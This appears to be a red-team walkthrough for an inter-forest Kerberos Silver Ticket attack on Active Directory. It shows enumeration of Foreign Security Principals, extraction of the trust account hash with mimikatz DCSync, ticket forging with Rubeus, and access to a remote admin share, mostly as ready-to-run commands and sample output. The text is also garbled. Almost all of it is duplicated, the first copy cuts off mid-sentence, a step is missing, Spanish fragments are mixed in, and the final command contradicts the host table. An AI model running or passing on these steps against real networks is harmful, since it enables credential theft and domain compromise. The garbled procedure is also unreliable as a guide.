```powershell
# FROM SOURCE.COM
Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" | select name,trustPartner,trustDirection,trustAttributes,trustType,flatName
# name: target.com
# trustPartner: target.com
# trustDirection: 1              
# trustAttributes: 8                   
# trustType: 2                     
# flatName: TARGET               
```

In this scenario, the value of the trust does not lie in granting direct privileges, but in the fact that the remote domain is already using external SIDs from `SOURCE` inside its own ACLs through Foreign Security Principal (FSP) objects. That means `TARGET` recognizes groups or identities from `SOURCE` as valid authorization subjects over internal resources.

If we identify which external SID was incorporated into `TARGET`, we can reconstruct which real group in `SOURCE` it represents and which users inherit that access. From there, if we also control the trust key, it is possible to forge a coherent ticket for a user in `SOURCE` that includes the groups expected by `TARGET`, and use it to request a TGS against specific services in the remote domain.

The important point here is that the attack does not depend on prior administrative privileges in `TARGET`, but on the fact that `TARGET` has already delegated access to external identities from `SOURCE` through FSPs. The forged ticket does not “create” new permissions: it reproduces an identity that `TARGET` already trusts to authorize. For that reason, the real success of the abuse depends on two things: that the FSP is linked to a useful ACL and that the target service or host accepts the ticket without revalidating the PAC.
## Requirements

1. Enumerate FSP → confirms that target uses your SID in some ACL and the group RID

We only need to identify the external SID and its final RID, because that is the identifier `TARGET` is using in its ACLs and the one that must appear coherently in the `/groups` field of the forged ticket.

```powershell
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname target.com --dn DC=target,DC=com

cn: S-1-5-4
cn: S-1-5-11
cn: S-1-5-17
cn: S-1-5-9
--------------------
cn: S-1-5-21-3926355307-1661546229-813047887-1045
memberOf: CN=source Users,CN=Users,DC=target,DC=com
```

From the FSP we extract RID `1045`, which corresponds to a real group in `SOURCE` (`target Jump Users`). Any user who is a member of that group will inherit in `TARGET` the permissions assigned to that external SID.

2. Enumerate the RID of the user to impersonate

```powershell
# Resolve the external SID and determine which source group it represents
ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-1045) --attributes objectClass,sAMAccountName,distinguishedName
# objectClass: group
# sAMAccountName: target Jump Users
# distinguishedName: CN=target Jump Users,CN=Users,DC=source,DC=com

# Enumerate users in the "target Jump Users" group to determine who receives permissions in target through the FSP and their RID
net group "target Jump Users" /domain
# ada

ldapsearch "(sAMAccountName=ada)" --attributes objectSid
# objectSid: S-1-5-21-3926355307-1661546229-813047887-1001
```

> The detected RID is `1001`

4. Host enumeration in the remote domain `target.COM` (to determine which host to attack with the Silver Ticket)

```powershell
ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=target,DC=com --hostname target.com

# sAMAccountName: DC01$
# sAMAccountName: JMP01$
```

> An inter-forest Silver Ticket is only effective on servers that do _not_ revalidate the PAC. DCs and hosts that do validate it will always respond with ACCESS_DENIED. The only real way to know whether a host validates the PAC is to test them one by one.

| Host  | Validates PAC? | Accepts fake Silver PAC? | Access? |
| ----- | ------------ | ------------------------- | -------- |
| JMP01 | ❌ No         | ✔️ Yes                    | Works    |
| DC01  | ✔️ Siempre   | ❌ Nunca                   | Denied   |

5. NTLM hash of the trust (target$)

> The hash of the `target$` account is the trust key. Both domains share this same key, and the KDC uses it to sign and validate inter-forest TGTs. With that hash you can forge valid tickets for the remote domain.

```powershell
# 6. NTLM hash of the trust account (e.g. "source\target$") HIGH INTEGRITY
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:source\target$" "exit"
# Hash NTLM: 6150491cceb080dffeaaec5e60d8f58d
```

> Even when AES keys exist, many trust relationships still operate with RC4 for compatibility. For that reason, in practice the NTLM hash is the one most often used to generate inter-forest Silver Tickets.

6. Base SID of the local domain

```powershell
[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Translate([System.Security.Principal.SecurityIdentifier]).value
```

## Exploitation

1. Build (forge) an inter-realm TGT for target

impersonating a user from source (“ada”). The TGT is signed using the trust account hash (`source\target$`)

```powershell
# User
.\Rubeus.exe silver /user:ada /domain:source.com /sid:sid_source /id:1001 /groups:513,1106,1045 /service:krbtgt/target.com /rc4:HASH_TRUST_KEY /nowrap
```

- `/user:ada`: source user to impersonate.
- `/domain:source.COM`: domain of the user to impersonate.
- `/sid:<SID_source>`: base SID of the source domain.
- `/id:1001`: RID of the user to impersonate (last value of the SID).
- `/groups`: defines the RIDs of the domain groups you want the impersonated user to have inside the ticket. Common examples:
	- 513 → _Domain Users_
	- 1106 → _Workstation Admins_
	- 1045 → _target Jump Users_: this is critical for it to work because without that RID, the PAC will be incoherent → rejected
- `/service:krbtgt/target.com`: target service (krbtgt of the target domain, indicates that the TGT will be valid in target).
- `/rc4:6150491cceb080dffeaaec5e60d8f58d`: NTLM hash of the trust key (used to sign the ticket).

2. Request a TGS from the target DC using that TGT

```powershell
.\Rubeus.exe asktgs /service:cifs/jmp01.target.com /dc:dc01.target.com /nowrap /ticket: /ptt

# Access the resource (e.g. SMB resource)
ls \\dc01.target.com\c$

# purge tickets
klist purge
```

- `asktgs` is used to request a service ticket (TGS) in the destination domain.
- `/service` defines the SPN of the service for which you are requesting the TGS, but whether it works depends on the host: it only works if that host does not validate the PAC; if it does, the SPN does not matter, it will fail.
- `/dc`: the name of the domain controller in the target domain responsible for 
```powershell
# FROM SOURCE.COM
Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" | select name,trustPartner,trustDirection,trustAttributes,trustType,flatName
# name: target.com
# trustPartner: target.com
# trustDirection: 1              
# trustAttributes: 8                   
# trustType: 2                     
# flatName: TARGET               
```

In this scenario, the value of the trust does not lie in granting direct privileges, but in the fact that the remote domain is already using external SIDs from `SOURCE` inside its own ACLs through Foreign Security Principal (FSP) objects. That means `TARGET` recognizes groups or identities from `SOURCE` as valid authorization subjects over internal resources.

If we identify which external SID was incorporated into `TARGET`, we can reconstruct which real group in `SOURCE` it represents and which users inherit that access. From there, if we also control the trust key, it is possible to forge a coherent ticket for a user in `SOURCE` that includes the groups expected by `TARGET`, and use it to request a TGS against specific services in the remote domain.

The important point here is that the attack does not depend on prior administrative privileges in `TARGET`, but on the fact that `TARGET` has already delegated access to external identities from `SOURCE` through FSPs. The forged ticket does not “create” new permissions: it reproduces an identity that `TARGET` already trusts to authorize. For that reason, the real success of the abuse depends on two things: that the FSP is linked to a useful ACL and that the target service or host accepts the ticket without revalidating the PAC.
## Requirements

1. Enumerate FSP → confirms that target uses your SID in some ACL and the group RID

We only need to identify the external SID and its final RID, because that is the identifier `TARGET` is using in its ACLs and the one that must appear coherently in the `/groups` field of the forged ticket.

```powershell
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname target.com --dn DC=target,DC=com

cn: S-1-5-4
cn: S-1-5-11
cn: S-1-5-17
cn: S-1-5-9
--------------------
cn: S-1-5-21-3926355307-1661546229-813047887-1045
memberOf: CN=source Users,CN=Users,DC=target,DC=com
```

From the FSP we extract RID `1045`, which corresponds to a real group in `SOURCE` (`target Jump Users`). Any user who is a member of that group will inherit in `TARGET` the permissions assigned to that external SID.

2. Enumerate the RID of the user to impersonate

```powershell
# Resolve the external SID and determine which source group it represents
ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-1045) --attributes objectClass,sAMAccountName,distinguishedName
# objectClass: group
# sAMAccountName: target Jump Users
# distinguishedName: CN=target Jump Users,CN=Users,DC=source,DC=com

# Enumerate users in the "target Jump Users" group to determine who receives permissions in target through the FSP and their RID
net group "target Jump Users" /domain
# ada

ldapsearch "(sAMAccountName=ada)" --attributes objectSid
# objectSid: S-1-5-21-3926355307-1661546229-813047887-1001
```

> The detected RID is `1001`

4. Host enumeration in the remote domain `target.COM` (to determine which host to attack with the Silver Ticket)

```powershell
ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=target,DC=com --hostname target.com

# sAMAccountName: DC01$
# sAMAccountName: JMP01$
```

> An inter-forest Silver Ticket is only effective on servers that do _not_ revalidate the PAC. DCs and hosts that do validate it will always respond with ACCESS_DENIED. The only real way to know whether a host validates the PAC is to test them one by one.

| Host  | Validates PAC? | Accepts fake Silver PAC? | Access? |
| ----- | ------------ | ------------------------- | -------- |
| JMP01 | ❌ No         | ✔️ Yes                    | Works    |
| DC01  | ✔️ Siempre   | ❌ Nunca                   | Denied   |

5. NTLM hash of the trust (target$)

> The hash of the `target$` account is the trust key. Both domains share this same key, and the KDC uses it to sign and validate inter-forest TGTs. With that hash you can forge valid tickets for the remote domain.

```powershell
# 6. NTLM hash of the trust account (e.g. "source\target$") HIGH INTEGRITY
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:source\target$" "exit"
# Hash NTLM: 6150491cceb080dffeaaec5e60d8f58d
```

> Even when AES keys exist, many trust relationships still operate with RC4 for compatibility. For that reason, in practice the NTLM hash is the one most often used to generate inter-forest Silver Tickets.

6. Base SID of the local domain

```powershell
[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Translate([System.Security.Principal.SecurityIdentifier]).value
```

## Exploitation

1. Build (forge) an inter-realm TGT for target

impersonating a user from source (“ada”). The TGT is signed using the trust account hash (`source\target$`)

```powershell
# User
.\Rubeus.exe silver /user:ada /domain:source.com /sid:sid_source /id:1001 /groups:513,1106,1045 /service:krbtgt/target.com /rc4:HASH_TRUST_KEY /nowrap
```

- `/user:ada`: source user to impersonate.
- `/domain:source.COM`: domain of the user to impersonate.
- `/sid:<SID_source>`: base SID of the source domain.
- `/id:1001`: RID of the user to impersonate (last value of the SID).
- `/groups`: defines the RIDs of the domain groups you want the impersonated user to have inside the ticket. Common examples:
	- 513 → _Domain Users_
	- 1106 → _Workstation Admins_
	- 1045 → _target Jump Users_: this is critical for it to work because without that RID, the PAC will be incoherent → rejected
- `/service:krbtgt/target.com`: target service (krbtgt of the target domain, indicates that the TGT will be valid in target).
- `/rc4:6150491cceb080dffeaaec5e60d8f58d`: NTLM hash of the trust key (used to sign the ticket).

2. Request a TGS from the target DC using that TGT

```powershell
.\Rubeus.exe asktgs /service:cifs/jmp01.target.com /dc:dc01.target.com /nowrap /ticket: /ptt

# Access the resource (e.g. SMB resource)
ls \\dc01.target.com\c$

# purge tickets
klist purge
```

- `asktgs` is used to request a service ticket (TGS) in the destination domain.
- `/service` defines the SPN of the service for which you are requesting the TGS, but whether it works depends on the host: it only works if that host does not validate the PAC; if it does, the SPN does not matter, it will fail.
- `/dc`: the name of the domain controller in the target domain responsible for emitir el TGS
- `/ticket`: the inter-domain TGT (forged or legitimate) that you will use as the base to request the TGS. issue the TGS
- `/ticket`: the inter-domain TGT (forged or legitimate) that you will use as the base to request the TGS.

